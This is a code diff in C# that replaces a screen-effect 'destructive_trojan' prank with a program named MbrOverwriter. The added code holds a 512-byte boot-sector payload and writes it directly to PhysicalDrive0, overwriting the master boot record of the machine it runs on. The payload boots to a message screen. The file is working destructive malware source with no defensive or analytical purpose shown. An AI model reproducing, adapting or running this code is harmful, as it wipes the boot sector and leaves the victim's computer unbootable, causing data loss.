@@ -1,82 +1,20 @@
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Text;
-using System.Threading;
-using System.Windows.Forms;
-using System.Drawing;
-using System.IO;
 using System.Runtime.InteropServices;
-using System.Diagnostics;
+using System.Text;
 
-namespace destructive_trojan
+namespace MbrOverwriter
 {
-    public class mousetrail
+    public static class Class1
     {
-        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
-        CallingConvention = CallingConvention.StdCall)]
-        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
-        out IntPtr piSmallVersion, int amountIcons);
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern IntPtr GetDC(IntPtr hWnd);
-        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
-        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
-        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
-        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
-        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool DeleteObject(IntPtr hObject);
-        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
-        [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
-        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
-        [DllImport("gdi32.dll")]
-        static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);
-        [DllImport("user32.dll")]
-        static extern IntPtr GetDesktopWindow();
-        [DllImport("user32.dll")]
-        static extern IntPtr GetWindowDC(IntPtr hwnd);
-        [DllImport("user32.dll")]
-        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
-        [DllImport("User32.dll")]
-        static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
-        [DllImport("gdi32.dll")]
-        static extern IntPtr CreateSolidBrush(int crColor);
-        [DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
-        public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
-        int nWidthDest, int nHeightDest,
-        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
-        BLENDFUNCTION blendFunction);
-        [DllImport("gdi32.dll")]
-        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,
-        IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
-        TernaryRasterOperations dwRop);
-        [DllImport("gdi32.dll")]
-        static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
-        int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
-        int yMask);
-        [DllImport("gdi32.dll")]
-        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);
-        [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
-        public static extern bool DeleteDC(IntPtr hdc);
         [DllImport("kernel32")]
-        private static extern IntPtr CreateFile(
-            string lpFileName,
-            uint dwDesiredAccess,
-            uint dwShareMode,
-            IntPtr lpSecurityAttributes,
-            uint dwCreationDisposition,
-            uint dwFlagsAndAttributes,
-            IntPtr hTemplateFile);
+        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
+            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
 
         [DllImport("kernel32")]
-        private static extern bool WriteFile(
-            IntPtr hFile,
-            byte[] lpBuffer,
-            uint nNumberOfBytesToWrite,
-            out uint lpNumberOfBytesWritten,
-            IntPtr lpOverlapped);
+        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
+            out uint lpNumberBytesWritten, IntPtr lpOverlapped);
 
         private const uint GenericRead = 0x80000000;
         private const uint GenericWrite = 0x40000000;
@@ -85,155 +23,51 @@ namespace destructive_trojan
 
         private const uint FileShareRead = 0x1;
         private const uint FileShareWrite = 0x2;
-
-        //dwCreationDisposition
         private const uint OpenExisting = 0x3;
-
-        //dwFlagsAndAttributes
-        private const uint FileFlagDeleteOnClose = 0x4000000;
-
+        private const uint FileFlagDeleteOnClose = 0x40000000;
         private const uint MbrSize = 512u;
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool CloseHandle(IntPtr hHandle);
-        enum TernaryRasterOperations : uint
+
+        public static void Main(string[] args)
         {
-            /// <summary>dest = source</summary>
-            SRCCOPY = 0x00CC0020,
-            /// <summary>dest = source OR dest</summary>
-            SRCPAINT = 0x00EE0086,
-            /// <summary>dest = source AND dest</summary>
-            SRCAND = 0x008800C6,
-            /// <summary>dest = source XOR dest</summary>
-            SRCINVERT = 0x00660046,
-            /// <summary>dest = source AND (NOT dest)</summary>
-            SRCERASE = 0x00440328,
-            /// <summary>dest = (NOT source)</summary>
-            NOTSRCCOPY = 0x00330008,
-            /// <summary>dest = (NOT src) AND (NOT dest)</summary>
-            NOTSRCERASE = 0x001100A6,
-            /// <summary>dest = (source AND pattern)</summary>
-            MERGECOPY = 0x00C000CA,
-            /// <summary>dest = (NOT source) OR dest</summary>
-            MERGEPAINT = 0x00BB0226,
-            /// <summary>dest = pattern</summary>
-            PATCOPY = 0x00F00021,
-            /// <summary>dest = DPSnoo</summary>
-            PATPAINT = 0x00FB0A09,
-            /// <summary>dest = pattern XOR dest</summary>
-            PATINVERT = 0x005A0049,
-            /// <summary>dest = (NOT dest)</summary>
-            DSTINVERT = 0x00550009,
-            /// <summary>dest = BLACK</summary>
-            BLACKNESS = 0x00000042,
-            /// <summary>dest = WHITE</summary>
-            WHITENESS = 0x00FF0062,
-            /// <summary>
-            /// Capture window as seen on screen.  This includes layered windows
-            /// such as WPF windows with AllowsTransparency="true"
-            /// </summary>
-            CAPTUREBLT = 0x40000000
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        public struct POINT
-        {
-            public int X;
-            public int Y;
+            var mbrData = new byte[] {0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0xFC, 0xB8, 0x12, 0x00, 0xCD, 0x10, 0xBE, 0x24, 0x7C, 0xB3,
+0x09, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xB7, 0x00, 0xAC, 0x3C, 0x00, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
+0x10, 0xEB, 0xF5, 0xC3, 0x4F, 0x68, 0x2E, 0x2E, 0x2E, 0x20, 0x68, 0x69, 0x20, 0x67, 0x75, 0x79,
+0x73, 0x21, 0x0D, 0x0A, 0x49, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x20,
+0x61, 0x74, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x73, 0x63, 0x72, 0x65, 0x65, 0x6E, 0x2C, 0x20,
+0x79, 0x6F, 0x75, 0x27, 0x72, 0x65, 0x20, 0x70, 0x72, 0x6F, 0x62, 0x61, 0x62, 0x6C, 0x79, 0x20,
+0x74, 0x65, 0x73, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x6D, 0x79, 0x20, 0x6E, 0x65, 0x77, 0x20, 0x4D,
+0x42, 0x52, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x77, 0x72, 0x69, 0x74, 0x65, 0x72, 0x2E, 0x0D, 0x0A,
+0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x6D, 0x79, 0x20, 0x66, 0x69, 0x72, 0x73, 0x74,
+0x20, 0x65, 0x78, 0x70, 0x65, 0x72, 0x69, 0x65, 0x6E, 0x63, 0x65, 0x20, 0x77, 0x69, 0x74, 0x68,
+0x20, 0x4E, 0x41, 0x53, 0x4D, 0x2E, 0x0D, 0x0A, 0x2E, 0x2E, 0x2E, 0x0D, 0x0A, 0x49, 0x20, 0x68,
+0x6F, 0x70, 0x65, 0x20, 0x6D, 0x79, 0x20, 0x74, 0x75, 0x74, 0x6F, 0x72, 0x69, 0x61, 0x6C, 0x20,
+0x68, 0x65, 0x6C, 0x70, 0x65, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x2C, 0x20, 0x69, 0x66, 0x20, 0x73,
+0x6F, 0x20, 0x64, 0x6F, 0x6E, 0x27, 0x74, 0x20, 0x66, 0x6F, 0x72, 0x67, 0x65, 0x74, 0x20, 0x61,
+0x62, 0x6F, 0x75, 0x74, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x2C, 0x20, 0x73, 0x75, 0x62, 0x20, 0x61,
+0x6E, 0x64, 0x20, 0x63, 0x6F, 0x6D, 0x6D, 0x65, 0x6E, 0x74, 0x20, 0x3A, 0x44, 0x0D, 0x0A, 0x2E,
+0x2E, 0x2E, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x79, 0x65, 0x61, 0x68, 0x2C, 0x20, 0x74, 0x68, 0x61,
+0x74, 0x27, 0x73, 0x20, 0x61, 0x6C, 0x6C, 0x20, 0x3A, 0x29, 0x2E, 0x0D, 0x0A, 0x42, 0x74, 0x77,
+0x2C, 0x20, 0x64, 0x6F, 0x20, 0x75, 0x20, 0x6C, 0x69, 0x6B, 0x65, 0x20, 0x74, 0x68, 0x61, 0x74,
+0x20, 0x6E, 0x69, 0x63, 0x65, 0x20, 0x62, 0x6C, 0x75, 0x65, 0x20, 0x63, 0x6F, 0x6C, 0x6F, 0x72,
+0x3F, 0x0D, 0x0A, 0x0D, 0x0A, 0x0D, 0x0A, 0x41, 0x6C, 0x77, 0x61, 0x79, 0x73, 0x20, 0x72, 0x65,
+0x6D, 0x65, 0x6D, 0x62, 0x65, 0x72, 0x21, 0x20, 0x43, 0x6C, 0x75, 0x74, 0x74, 0x65, 0x72, 0x20,
+0x69, 0x73, 0x20, 0x68, 0x65, 0x72, 0x65, 0x2E, 0x2E, 0x2E, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
+};
 
-            public POINT(int x, int y)
-            {
-                this.X = x;
-                this.Y = y;
-            }
-
-            public static implicit operator System.Drawing.Point(POINT p)
-            {
-                return new System.Drawing.Point(p.X, p.Y);
-            }
-
-            public static implicit operator POINT(System.Drawing.Point p)
-            {
-                return new POINT(p.X, p.Y);
-            }
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        public struct BLENDFUNCTION
-        {
-            byte BlendOp;
-            byte BlendFlags;
-            byte SourceConstantAlpha;
-            byte AlphaFormat;
-
-            public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
-            {
-                BlendOp = op;
-                BlendFlags = flags;
-                SourceConstantAlpha = alpha;
-                AlphaFormat = format;
-            }
+            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
+                OpenExisting, 0, IntPtr.Zero);
+            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+            Environment.Exit(-1);
         }
 
-        //
-        // currently defined blend operation
-        //
-        const int AC_SRC_OVER = 0x00;
-
-        //
-        // currently defined alpha format
-        //
-        const int AC_SRC_ALPHA = 0x01;
-
-        public static Icon Extract(string file, int number, bool largeIcon)
-        {
-            IntPtr large;
-            IntPtr small;
-            ExtractIconEx(file, number, out large, out small, 1);
-            try
-            {
-                return Icon.FromHandle(largeIcon ? large : small);
-            }
-            catch
-            {
-                return null;
-            }
-        }
-        public static void Main()
-        {
-            Thread.Sleep(50);
-            DateTime startTime = DateTime.Now;
-            TimeSpan maxDuration = TimeSpan.FromSeconds(30); //Duration of effect
-            Random r;
-            int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
-            int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
-            uint[] rndclr = { 0xFF0000, 0xFF00BC, 0x00FF33, 0xFFFF700, 0x00FFEF };
-            POINT[] lppoint = new POINT[3];
-            Icon some_ico = Extract("shell32.dll", 232, true);
-            while (DateTime.Now - startTime < maxDuration)
-            {
-                r = new Random();
-                IntPtr hwnd = GetDesktopWindow();
-                IntPtr hdc = GetWindowDC(hwnd);
-                IntPtr desktop = GetDC(IntPtr.Zero);
-                IntPtr rndcolor = CreateSolidBrush(0);
-                IntPtr mhdc = CreateCompatibleDC(hdc);
-                IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
-                IntPtr holdbit = SelectObject(mhdc, hbit);
-                hwnd = GetDesktopWindow();
-                hdc = GetWindowDC(hwnd);
-                DeleteDC(hdc);
-                int posX = Cursor.Position.X;
-                int posY = Cursor.Position.Y;
-                desktop = GetDC(IntPtr.Zero);
-                using (Graphics g = Graphics.FromHdc(desktop))
-                {
-                    g.DrawIcon(some_ico, posX, posY);
-                }
-                ReleaseDC(IntPtr.Zero, desktop);
-                Thread.Sleep(40);
-
-            }
-        }
     }
 }
-
